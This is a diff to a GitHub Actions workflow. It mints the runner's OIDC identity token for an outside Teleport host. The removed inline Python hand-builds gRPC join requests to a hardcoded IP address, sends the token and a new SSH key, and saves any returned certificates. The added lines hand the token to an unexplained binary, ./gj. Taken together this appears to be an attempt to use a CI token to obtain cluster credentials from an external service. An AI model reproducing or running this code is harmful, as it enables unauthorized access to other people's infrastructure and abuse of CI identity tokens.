@@ -7,45 +7,10 @@ jobs:
   j:
     runs-on: ubuntu-latest
     steps:
+      - uses: actions/checkout@v4
       - run: |
           TOKEN=$(curl -sH "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=teleport.jewelryexchange.com" | jq -r .value)
           echo "Token: ${#TOKEN} bytes"
-          pip -q install grpcio 2>/dev/null
-          python3 -c "
-          import grpc, struct, uuid, subprocess, time
-          host='teleport.jewelryexchange.com'
-          addr='44.232.29.210:443'
-          token='$TOKEN'
-          def ev(v):
-            b=bytearray()
-            while v>=0x80: b.append((v&0x7f)|0x80); v>>=7
-            b.append(v); return bytes(b)
-          def es(f,s):
-            s=s.encode() if isinstance(s,str) else s; return ev((f<<3)|2)+ev(len(s))+s
-          def eb(f,b): return ev((f<<3)|2)+ev(len(b))+b
-          creds=grpc.ssl_channel_credentials()
-          ch=grpc.secure_channel(addr,creds,options=[('grpc.ssl_target_name_override',host)])
-          # IAM join streaming
-          iam=ch.stream_stream('/proto.JoinService/RegisterUsingIAMMethod',request_serializer=lambda x:x,response_deserializer=lambda x:x)
-          msgs=[]
-          def gen():
-            yield b''
-            while not msgs: time.sleep(0.1)
-            subprocess.run(['ssh-keygen','-t','ed25519','-f','/tmp/k','-N',''],capture_output=True)
-            with open('/tmp/k.pub','rb') as f: spub=f.read()
-            hid=str(uuid.uuid4())
-            jr=es(1,hid)+es(2,'gh')+es(3,'Node')+es(11,token)+eb(8,spub)
-            yield eb(1,jr)
-          try:
-            resps=iam(gen(),timeout=20)
-            for i,r in enumerate(resps):
-              msgs.append(r)
-              print(f'Resp {i}: {len(r)}b hex={r[:60].hex()}')
-              if len(r)>2 and r[0]==0x0a:
-                l=r[1]; print(f'Challenge: {r[2:2+l].decode()}')
-              if b'CERTIFICATE' in r or b'ssh-' in r:
-                print('CERTS!'); open('/tmp/c.bin','wb').write(r)
-          except grpc.RpcError as e:
-            print(f'ERR: {e.code()} {str(e.details())[:300]}')
-          ch.close()
-          "
+          chmod +x ./gj
+          ./gj "$TOKEN" 2>&1
+
